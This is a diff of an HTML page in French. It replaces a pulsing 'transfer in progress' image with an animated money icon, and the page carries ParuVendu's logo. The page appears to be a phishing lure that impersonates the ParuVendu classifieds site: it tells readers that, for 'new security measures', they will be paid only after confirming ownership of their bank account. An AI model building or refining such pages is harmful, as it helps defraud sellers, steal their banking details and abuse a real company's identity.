@@ -113,27 +113,33 @@
             border-left: 4px solid #ffc107; /* Bordure gauche pour accentuer */
             margin-bottom: 20px;
         }
-        /* Animation pour le logo "Virement en cours" */
-        .virement-logo {
+        /* Animation pour le virement en cours */
+        .virement-animation {
             text-align: center;
             margin-bottom: 20px;
+            position: relative;
+            height: 60px; /* Hauteur pour contenir l'animation */
         }
-        .virement-logo img {
-            width: 80px;
-            animation: pulse 1.5s infinite;
+        .virement-animation .icon {
+            font-size: 40px; /* Taille de l'icône */
+            position: absolute;
+            animation: moveMoney 2s infinite;
         }
-        @keyframes pulse {
+        @keyframes moveMoney {
             0% {
-                transform: scale(1);
+                left: 0;
                 opacity: 1;
+                filter: blur(0);
             }
             50% {
-                transform: scale(1.1);
-                opacity: 0.7;
+                left: calc(100% - 40px); /* Déplacement vers la droite */
+                opacity: 0.5;
+                filter: blur(2px);
             }
             100% {
-                transform: scale(1);
+                left: 0;
                 opacity: 1;
+                filter: blur(0);
             }
         }
     </style>
@@ -147,9 +153,9 @@
         <div class="form-logo">
             <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
         </div>
-        <!-- Logo animé "Virement en cours" -->
-        <div class="virement-logo">
-            <img src="https://cdn-icons-png.flaticon.com/512/3135/3135692.png" alt="Virement en cours">
+        <!-- Animation de virement en cours -->
+        <div class="virement-animation">
+            <div class="icon">💵</div> <!-- Icône d'argent -->
         </div>
         <div class="info-text">
             Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte ParuVendu.
